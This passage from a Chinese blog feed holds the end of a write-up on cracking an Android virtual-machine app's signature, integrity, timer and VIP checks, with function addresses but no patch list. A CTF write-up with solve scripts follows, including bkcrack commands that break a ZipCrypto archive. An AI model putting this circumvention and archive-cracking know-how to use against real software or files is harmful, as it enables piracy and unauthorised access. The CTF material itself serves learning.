alt="检测代码段"></p><p>剩下的就简单了，修改返回值或者MD5即可。这里选择了后者，因为在三个<code>libuserkernel*.so</code>中MD5字节可以用python推算出来然后自动修改，而修改返回值得动代码，要分别在三个版本的so中找，挺麻烦的。</p><h2 id="再补充点小细节，完成"><a href="#再补充点小细节，完成" class="headerlink" title="再补充点小细节，完成"></a>再补充点小细节，完成</h2><p>这回打包运行终于没问题了，我重新捋一下要破解的位置，写了个完整的脚本，然后再次打包运行，能启动了！！！结果还没高兴30秒应用又崩溃了（′⌒`；）不知道是忽略了什么，但是之前搜签名的SHA1的时候搜到一个奇怪的位置：<code>Engine::DoVerifyLocal(0x1DD984)</code>，它里面除了签名的哈希值外，还有一个设置30秒定时器的操作，与现在的情况比较相符，尝试性的改了一下，然后运行成功。应用打开放着跑了半个小时，终于没有什么奇怪的现象了，只是手动打开登录界面，点击退出登录时（实际上自己并未登录，登录效果是改smali代码改出来的），会提示你充vip。这个是小问题，找到对应xml把那些控件隐藏就OK了。至此，光速虚拟机的破解完结撒花~~</p><h2 id="逆向时的奇怪问题"><a href="#逆向时的奇怪问题" class="headerlink" title="逆向时的奇怪问题"></a>逆向时的奇怪问题</h2><p>我在逆向时还是走了很多弯路的，尤其是C++的<code>std::string</code>在编译内联后产生的代码，老人地铁手机.jpg：</p><p><img src="/pictures/VPhone-Reverse/18.png" alt="std::string"></p><p>在这个应用的so中，有大量的这种代码，所以有必要先搞清楚它的结构。<code>std::string</code>的结构是这样的：</p><ul><li><p><code>sizeof (std::string) == 24</code>。</p></li><li><p>如果字符串长度（含终止<code>\0</code>）不超过23，那么结构体第一个字节是<code>strlen(s) * 2</code>，剩下的空间用来存放字符串，这样就可以不用在堆上分配内存从而提高效率。</p></li><li><p>如果字符串长度不满足上述条件，那么结构体最后八字节是指向真正字符串的指针，中间八字节是字符串长度，前八字节是为字符串申请的堆空间的长度加1，由于分配以16字节对齐，所以查看第一字节的第0位是否为1即可区别出字符串是哪一种情况。</p></li><li><p>数据结构的示意代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> std&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">string</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                <span class="keyword">uint8_t</span> isLongString: <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">uint8_t</span> shortStringLen: <span class="number">7</span>;</span><br><span class="line">                <span class="keyword">char</span> astr[<span class="number">23</span>];</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                <span class="keyword">size_t</span> spaceLenPlus1;</span><br><span class="line">                <span class="keyword">size_t</span> stringLen;</span><br><span class="line">                <span class="keyword">char</span> *pstr;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 取C风格字符串指针</span></span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> * <span class="keyword">operator</span>*() <span class="keyword">const</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> isLongString ? pstr : astr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 取长度</span></span><br><span class="line">        <span class="function"><span class="keyword">size_t</span> <span class="title">length</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> isLongString ? stringLen : shortStringLen;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><p>像开头那段IDA反编译的代码，事实上是把<code>(std::string)var_2F8</code>字符串存储到<code>a1</code>（类指针）的一个成员变量里，乱七八糟的代码是拷贝构造函数内联后的杰作：如果<code>(a1 + 1368) != var_2F8</code> （肯定不相等，因为<code>a1</code>在堆上，<code>var_2F8</code>反编译时是个数组在栈上，但拷贝构造函数不知道这一点，它只知道两个指针相等就不用复制了。我在开始的时候没看懂这段代码，然后就很迷茫），就把后者调整为<code>const char *</code>指针并传入以它和它的长度为参数的构造函数<code>sub_6F400</code>。所以实际上源码中可能只是一个简单的<code>engine.uidStored = uid;</code>，然后得益于C++函数的内联，生成的代码就成了这副样子。</p><p>在逆向时发现的其他奇怪之处：</p><ul><li><p><code>verifyfunction_doVerifyKernelSignature(0x1D95A8)</code>处，看名称和逻辑猜测也是验证函数，但好像没有任何地方调用它？</p></li><li><p><code>Engine::DoVPhoneVerifyLocal(0x1DD984)</code>处，确实是在验签，目前仍不清楚触发条件，只知道修改了<code>libVphoneGaGaLib.so</code>的某处后启动时触发，然而我无法复现不触发的情况了，索性让函数直接返回。</p></li><li><p><code>0x174124</code>、<code>0x16F378</code>、<code>0x1D91C4</code>和<code>0x17191C</code>处的函数，对字符串的分析发现它们都与签名/验证有关，然而最后没有修改这几项仍然正常运行，就先不改了吧。</p></li><li><p><code>xxxRegisterTimer(0x7B854)</code>，名字随便起的：函数会设置一个定期调用回调函数的定时器，但是最后两个参数都是时间，猜测第一个是第一次调用的间隔时间，第二个是其余调用的间隔时间，但是有几个对此函数的调用逻辑又说不通？</p></li></ul><h2 id="梳理应用验证流程"><a href="#梳理应用验证流程" class="headerlink" title="梳理应用验证流程"></a>梳理应用验证流程</h2><p>总的来说，这个应用在防破解方面还是做了很多工作的，具体如下：</p><ul><li><p>引擎启动时，直接读取安装包中的<code>META-INF/KEY0.RSA</code>，进行签名的验证（这也就是在Java层拦截签名函数无效的原因）。验证失败则提示<code>initialize feature fail!</code>。</p></li><li><p>虚拟机启动时，通过<code>lib</code>位置间接获取安装包路径（Java层修改<code>mAppDir</code>劫持路径无效的原因），读取其中的几个关键文件（<code>classes*.dex</code>，<code>AndroidManifest.xml</code>），检查它们的长度和Crc32，检查结果先放入成员变量中，启动后如果发现它为0就不进行画面渲染等等。另一方面，有一个触发时间为启动后、触发条件未知的函数，它也会检测应用签名，如果失败就设置一个延迟时间为30秒的timer，timer回调时应用崩溃。</p></li><li><p>Java层材料（相关类名是<code>Lcom/vphonegaga/titan/personalcenter/beans/MaterialBean$Material;</code>）包含VIP的特权和过期时间等信息，它会传入<code>libVphoneGaGaLib.so</code>，后者访问<code>https://dcdn.appmarket.api.gsxnj.cn/api2/*.php</code>和<code>https://dcdn.appmarket.api.gsxnj.cn/api/time.php</code>进行联网校验，其中安卓10特权校验成功时才生成输入数据包（触摸事件等等）。另一方面<code>libVPhoneGaGaLib.so</code>会主动获取Java层中包含<code>token2</code>等数据的应用登录信息（相关类名<code>Lcom/vphonegaga/titan/user/User;</code>），然后通过socket发给<code>libuserkernel*.so</code>，<code>token2</code>和时间验证成功后输入数据包才被接受。</p></li><li><p><code>libuserkernel*.so</code>中记录了一个时间戳<code>T</code>，初始值为启动时间（猜测）。应用不定期获取时间，当超过<code>T</code>4分钟就发送一条信息给<code>libVPhoneGaGaLib.so</code>要求更新<code>T</code>的值，当超过<code>T</code>5分钟就故意陷入无限等待，这时虚拟机就无法正常使用了。但是，从用户登录起，每过3分钟<code>libVPhoneGaGaLib.so</code>就会主动把<code>token2</code>、<code>uid</code>之类的信息发送给<code>libuserkernel*.so</code>，后者用非对称算法验证<code>token2</code>的有效性，只有合法才会更新<code>T</code>的值。当<code>T</code>更新后，除非再过5分钟，否则不会停机，而如果<code>libVPhoneGaGaLib.so</code>一直每隔3分钟发送正确的信息，那么停机永远不会触发，虚拟机就正常运行了。<del>草，什么摇篮系统</del></p></li><li><p><code>libuserkernel*.so</code>有<code>ptrace</code>反调试和运行时代码验证：用自身的.plt和.text段计算MD5，并与.data段中某处的值做对比，有差别就陷入无限等待，导致虚拟机启动一直卡在0%处。</p></li></ul><p>应用的代码很多，而且很多验证失败的现象并不能提供什么线索，加上代码是C++编译的，关键函数并不好找。然而写入日志的符号信息让逆向分析难度降低了不少，上面的破解思路基本上是围绕着日志输出展开的。如果应用对日志采用了很复杂的加密方法，或者说对关键代码使用了ollvm，vmp之类的手段加固的话，逆向分析难度还是很大的。</p><h2 id="最后的修改清单"><a href="#最后的修改清单" class="headerlink" title="最后的修改清单"></a>最后的修改清单</h2><blockquote><p>因特殊原因，这里把具体的修改位置删掉了。逆向时遇到问题可以私聊。</p></blockquote><p>把改好的4个so与原so替换，然后就可以优雅地对应用进行签名了，最后附上安卓10面具安装成功的效果图：</p><p><img src="/pictures/VPhone-Reverse/19.png" alt="破解成功"></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>“抗疫”CTF题解</title>
      <link href="/2022/01/15/XDCTF/"/>
      <url>/2022/01/15/XDCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p><img src="/pictures/bili-small-shrink/110/2325.png"></img><br>这次比赛和 TBMK 一起打的, 做题的几天搜了很多文章, 感觉学到了很多东西.</p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 style="max-width: 100%" src="//music.163.com/outchain/player?type=2&id=785793&auto=0&height=66"></iframe><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>感觉 Misc 这种还是比较有意思的<img no-lazy style="display: inline; zoom: 0.5; margin: 0;" src="/pictures/bili-small-shrink/1/1950.png" alt="[OK]"></img></p><h3 id="贝斯的复仇"><a href="#贝斯的复仇" class="headerlink" title="贝斯的复仇"></a>贝斯的复仇</h3><a download href="/archives/xdctf/base.7z" style="display: block;"><span class="iconfont icon-archive-c"></span>附件下载</a><div class="note info flat"><p>为防止附件过大, 请用 gen_problem.py 动态生成题目文件 flag.base</p></div><p>打开的时候是不会的, 因为之前没见过这种base.<br>拿 python 写了个统计字符数量的脚本, 得出全是可打印字符并且少了其中几种, 比如引号方括号之类的.<br>然后去网上搜, 找到有个 base85, 拿 python 试了一下, 果然可以解密.<br>那剩下的就简单了, 每解密一次看看输出, 然后一层一层解密, flag 就出来了.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.base&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    s = f.read()</span><br><span class="line"></span><br><span class="line">tab = [base64.b16decode, base64.b32decode, base64.b64decode, base64.b85decode]</span><br><span class="line">k = [<span class="number">3</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> k: s = tab[i](s)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(s, encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个脚本看起来不是一层一层解密的. 因为比赛后自己整理并重写了一遍.</p><blockquote><p>flag{th4t_1s_b4s3_3nc0des}</p></blockquote><h3 id="capture"><a href="#capture" class="headerlink" title="capture"></a>capture</h3><a download href="/archives/xdctf/capture.7z" style="display: block;"><span class="iconfont icon-archive-c"></span>附件下载</a><p>先用 WireShark 打开, 然后, 呃, 不知道怎么下手. 还是先看看十六进制吧, 搜到一个 <code>flag</code> 字符串, 旁边还有个 PK 头.<br><img src="/pictures/xdctf_misc3_0.png" alt="查看十六进制"><br>这样目的就比较明确了, 翻了一下, 成功得到了—一个加密的压缩包.<br>然后在周围搜了一下, 有个<code>qwe123!@#114514</code>, 但那不是密码, 就先放弃了.<br>几天后突然想一条一条翻, 然后快到末尾的地方有一大串奇怪的base64<br><img src="/pictures/xdctf_misc3_1.png" alt="奇怪的字符串"><br>解码一下, 恍然大悟:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#######################################</span><br><span class="line">#         2021-05-25 19:35:31         #</span><br><span class="line">#######################################</span><br><span class="line">--------------------------------------------------</span><br><span class="line">WindowTitle:图片</span><br><span class="line">Time:2021-05-25 19:35:45</span><br><span class="line">[Delete]</span><br><span class="line">--------------------------------------------------</span><br><span class="line">WindowTitle:新建压缩文件</span><br><span class="line">Time:2021-05-25 19:35:55</span><br><span class="line">[Lshift]SECRET[Return]</span><br><span class="line">--------------------------------------------------</span><br><span class="line">WindowTitle:输入密码</span><br><span class="line">Time:2021-05-25 19:36:01</span><br><span class="line">[Capital]S[Back]ASDFGHJKL;&#x27;[Tab]ASDFGHJKL;&#x27;[Return]</span><br><span class="line">--------------------------------------------------</span><br><span class="line">WindowTitle:新建压缩文件</span><br><span class="line">Time:2021-05-25 19:36:09</span><br><span class="line">[Return]</span><br></pre></td></tr></table></figure></p><blockquote><p>mssctf{Pc4p_1s_S0o0o0o0o0o0o0o0o0oEz}</p></blockquote><h3 id="Evilcode"><a href="#Evilcode" class="headerlink" title="Evilcode"></a>Evilcode</h3><a download href="/archives/xdctf/Evilcode.7z" style="display: block;"><span class="iconfont icon-archive-c"></span>附件下载</a><p>是一堆不认识的十六进制文本, 但根据重复序列的特征和文本行数, 猜测是一张图片的 RGB. (之前打 NCTF 碰到过类似的题, 只不过那个直接给的是 bits).<br>写个脚本填入 RGB, 果然得到了一张图片. 用 QR research 扫一下, 把网址后面的 base16 解码一下就有了.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b16decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;code.bin&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    s = f.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">1080</span>, <span class="number">2400</span>), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">p = img.load()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2400</span>):</span><br><span class="line">    b = b16decode(s[j].upper())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1080</span>):</span><br><span class="line">        p[i, j] = (b[<span class="number">3</span> * i], b[<span class="number">3</span> * i + <span class="number">1</span>], b[<span class="number">3</span> * i + <span class="number">2</span>])</span><br><span class="line">img.save(<span class="string">&#x27;out.png&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>flag{D0NT_sc4n_QRc0d3_fr0m_Unkn0wns0ur4}</p></blockquote><h3 id="打不开的压缩包"><a href="#打不开的压缩包" class="headerlink" title="打不开的压缩包"></a>打不开的压缩包</h3><a download href="/archives/xdctf/attachment.zip" style="display: block;"><span class="iconfont icon-archive-c"></span>附件下载</a><p>压缩包有密码, 没有附加数据, 但里面除了 flag 以外还有个 hint.png, 而 png 图片的文件头我们是知道的, 而且文件的压缩算法是 ZipCrypto Store. 于是去网上找找看有没有什么破解的方法.<br>找到一篇博客, <a href="https://www.freebuf.com/articles/network/255145.html">链接</a><br>根据文中所述的方法, 尝试使用以下命令行:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C attachment.zip -c hint.png -p head.png</span><br></pre></td></tr></table></figure><br>这个大概跑了十几分钟, 然后出来了三段 key, 把它们填入下面的命令行.<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C attachment.zip -c flag -k c257ccb7 ee535b48 af274d68 -d flag</span><br><span class="line">bkcrack -C attachment.zip -c hint.png -k c257ccb7 ee535b48 af274d68 -d hint.png</span><br></pre></td></tr></table></figure><br>成功拿到其中的两个文件.<br><img src="/pictures/xdctf_misc6_0.png" alt="已解密的文件"><br><em>然而, 真正难的才刚刚开始</em><br>打开其中的 flag, 发现是一堆十进制数字(<a href="/archives/xdctf/flag.txt">查看文件</a>)<br>然后…观察了这段文本的特点, 尝试了很多方法:</p><ul><li>直接整数转字节串</li><li>base 系列算法</li><li>由于文本很多以12字节为周期, 尝试了以12个字符为1片切片, 然后对它们进行各种数值操作. 至于文件大小不是12的倍数, 按照”规律”补了个4</li><li>把字符数组根据索引模12分为12个类, 再观察它们的特征</li><li>重新回到 hint.png, 分析文件是否存在隐写</li><li>重新检查 attachment.zip, 分析有无数据附加</li></ul><p>然后, 全军覆没<img no-lazy style="display: inline; zoom: 0.5; margin: 0;" src="/pictures/bili-small-shrink/1/509.png" alt="[笑哭]"></img><br>后来根据 TBMK 发现的文章(<a href="https://github.com/XDSEC/miniLCTF_2021/blob/main/WriteUps/7!u!w/MiniL_WP.md#misc4-recombination----worked-noah">传送门</a>)<br>一看, 这不原题嘛, 然后根据这个知道了aa3d这个东西. 感叹到自己学的还是太少了qwq<br>按照这个做法, 是把文字排列为 97*47 的矩阵, 然后截图并用stegsolve偏移+异或<br><img src="/pictures/xdctf_misc6_1.png" alt="求解"></p><p><del>4559=97*47, 这个是真没想到</del><br>不管怎么样, 只能说解题的收获颇丰吧</p><blockquote><p>MiniL{A@3d-1s_Ar7!!}</p></blockquote><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><p>主要打的是 Re, 做到第七个做不动了<img no-lazy style="display: inline; zoom: 0.5; margin: 0;" src="/pictures/bili-small-shrink/1/16.png" alt="[灵魂出窍]"></img></p><h3 id="Rust-Rua死它"><a href="#Rust-Rua死它" class="headerlink" title="Rust? Rua死它!!!"></a>Rust? Rua死它!!!</h3><a download href="/archives/xdctf/rust.zip" style="display: block;"><span class="iconfont icon-archive-c"></span>附件下载</a><p>之前看过 rust 的一本参考书<psw>的一半的一半的一半</psw><br>结果, 宏什么的完全不知道, 只是看到类似于 <code>false as u8</code> 之类的不会一脸懵.<br>其实 rust 学好的话用起来应该还是很舒服的<br>然后就硬看, 终于看出这是个逐步分析的过程…<br>其中<code>never</code>是原文(<code>buf</code>), <code>gonna</code>是一个类似字节寄存器的玩意(<code>c</code>), <code>give</code>是当前字节指针(<code>p</code>)的索引. 诶~有<code>brainfuck</code>那味了.</p><div class="table-container"><table><thead><tr><th>前缀</th><th style="text-align:center">代号</th><th style="text-align:center">意义</th></tr></thead><tbody><tr><td>Never gonna give you up</td><td style="text-align:center">0</td><td style="text-align:center"><code>p++</code></td></tr><tr><td>Never gonna let you down</td><td style="text-align:center">1</td><td style="text-align:center"><code>p--</code></td></tr><tr><td>Never gonna run around and desert you</td><td style="text-align:center">2</td><td style="text-align:center"><code>(*p)++</code></td></tr><tr><td>Never gonna make you cry</td><td style="text-align:center">3</td><td style="text-align:center"><code>(*p)--</code></td></tr><tr><td>Never gonna say goodbye</td><td style="text-align:center">4</td><td style="text-align:center"><code>c=*p</code></td></tr><tr><td>Never gonna tell a lie and hurt you</td><td style="text-align:center">5</td><td style="text-align:center"><code>*p=c</code></td></tr></tbody></table></div><p>然后把那一大串歌词弄下来, 拿数字代替并包装成数组, 可以写出 python 脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">never = [<span class="number">148</span>, <span class="number">59</span>, <span class="number">143</span>, <span class="number">112</span>, <span class="number">121</span>, <span class="number">186</span>, <span class="number">106</span>, <span class="number">133</span>, <span class="number">55</span>, <span class="number">90</span>, <span class="number">164</span>, <span class="number">166</span>, <span class="number">167</span>, <span class="number">121</span>, <span class="number">174</span>, <span class="number">147</span>, <span class="number">148</span>, <span class="number">167</span>, <span class="number">99</span>, <span class="number">86</span>, <span class="number">81</span>, <span class="number">161</span>, <span class="number">151</span>, <span class="number">149</span>, <span class="number">132</span>, <span class="number">56</span>, <span class="number">88</span>, <span class="number">188</span>, <span class="number">141</span>, <span class="number">127</span>, <span class="number">151</span>, <span class="number">63</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = <span class="built_in">eval</span>(f.read())</span><br><span class="line"></span><br><span class="line">p = <span class="number">0</span></span><br><span class="line">val = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> never]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">        p = p + <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">2</span>:</span><br><span class="line">        val[p] = val[p] + <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(val)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>([(never[i] - val[i]) &amp; <span class="number">0xFF</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(never))]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>感觉这道题还是蛮有意思的<img no-lazy style="display: inline; zoom: 0.5; margin: 0;" src="/pictures/bili-small-shrink/25/461.png" alt="[罗小黑_可可爱爱]"></img></p><blockquote><p>flag{A6C33EA2571A2AE26BFAE7BEA2CD8F54}</p></blockquote><h3 id="文件勒索病毒"><a href="#文件勒索病毒" class="headerlink" title="文件勒索病毒"></a>文件勒索病毒</h3><p><a href="https://wwp.lanzouq.com/iPRr8ytvkti">附件下载</a>, 密码9ss8</p><blockquote><p>这个 exe 短小精悍, 应该是刻意处理过的, 它甚至没有 crt 的 main 函数, start 一来就是主逻辑. 用 DIE 扫描出程序是 vs2019 写的, 对于高版本 vs, 为了保持这种特性, 不太方便使用 CRT 函数(因为它们会链接到 msvcr14x, vcruntimex, 而且产生一堆 thunks), 所以程序只使用了 kernel32.dll 导出的 api 进行控制台操作.</p></blockquote><p>大概分析下这个文件干了什么<br><img src="/pictures/xdctf_re2_0.png" alt="主函数"><br>程序先获取控制台输入输出句柄, 然后就可以对控制台进行读写, 可以把它们想象成 stdin 和 stdout. 实际上 crt 函数大多是对 kernel32 的封装.<br>输入密码后, 程序进入下图:<br><img src="/pictures/xdctf_re2_1.png" alt="遍历文件"><br>先设置当前目录到有加密文件的目录, 然后遍历所有文件, 把文件路径和密码字符串传给<code>sub_401220</code>:<br><img src="/pictures/xdctf_re2_2.png" alt="解密文件"><br>可以看到, 程序对于打开的文件, 每次读取8个字节并解密, <code>sub_4011F0</code>就是解密函数.<br>注意这个<code>CreateFileA</code>在这里不是创建文件而是打开文件. 这个我当时学 win32 也一脸懵B. 类似的还有<code>OpenProcess</code>是打开进程(获取句柄)而不是创建进程; <code>CloseWindow</code>是最小化窗口而不是关闭窗口.<br><img src="/pictures/xdctf_re2_3.png" alt="解密函数"><br>这个就是解密的过程了, 那么可以想到根据 PNG 文件头去反推密码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">png_header = [<span class="number">0x89</span>, <span class="number">0x50</span>, <span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x0D</span>, <span class="number">0x0A</span>, <span class="number">0x1A</span>, <span class="number">0x0A</span>]</span><br><span class="line">enc_header = [<span class="number">0xCE</span>, <span class="number">0xC5</span>, <span class="number">0x66</span>, <span class="number">0x3F</span>, <span class="number">0x5E</span>, <span class="number">0x2A</span>, <span class="number">0xEB</span>, <span class="number">0x65</span>]</span><br><span class="line"></span><br><span class="line">key = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    s = <span class="built_in">bin</span>(png_header[i] + i)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    s = <span class="built_in">int</span>(s[-i:] + s[:-i], <span class="number">2</span>)</span><br><span class="line">    key[i] = s ^ enc_header[i]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(key))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>把这个输入到所给程序就OK</p><blockquote><p>flag{c405e6725f58ba79c4078b02ac93808b68a12499}</p></blockquote><h3 id="saber"><a href="#saber" class="headerlink" title="saber"></a>saber</h3><a download href="/archives/xdctf/saber.7z" style="display: block;"><span class="iconfont icon-archive-c"></span>附件下载</a><p>常见的 Misc 套路, 给了一个图片, 其中 exe 放在 PNG 文件末尾, 用十六进制编辑器可以把文件 dump 出来<br>然后就简单了, 写个程序异或回来即可:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="keyword">xor</span>[] = &#123;</span><br><span class="line">    <span class="number">0x44</span>, <span class="number">0x70</span>, <span class="number">0x26</span>, <span class="number">0x2C</span>,</span><br><span class="line">    <span class="number">0xB8</span>, <span class="number">0xB3</span>, <span class="number">0xEA</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xF0</span>, <span class="number">0xF6</span>, <span class="number">0xCD</span>, <span class="number">0xAF</span>,</span><br><span class="line">    <span class="number">0x7C</span>, <span class="number">0xBE</span>, <span class="number">0xD2</span>, <span class="number">0x4E</span>,</span><br><span class="line">    <span class="number">0x54</span>, <span class="number">0x78</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    srand(<span class="number">12</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span 